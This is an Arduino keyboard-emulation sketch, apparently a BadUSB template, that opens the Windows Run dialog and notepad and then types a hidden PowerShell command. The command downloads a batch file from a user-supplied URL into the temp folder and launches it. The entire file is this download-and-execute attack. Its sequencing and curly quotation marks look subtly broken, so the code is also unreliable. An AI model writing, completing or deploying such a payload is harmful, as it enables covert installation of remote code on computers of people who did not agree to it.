#include "Keyboard.h"


void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup() {
  
  Keyboard.begin();

  delay(500);

  delay(1500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("notepad");
  typeKey(KEY_RETURN);
  delay(600);

  Keyboard.print("powershell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(‘ --your url -- ’,’%TEMP%\example.bat’); Start-Process “%TEMP%\example.bat”;");
  delay(300);
  typeKey(KEY_RETURN);
  
  Keyboard.end();
}

void loop() {}
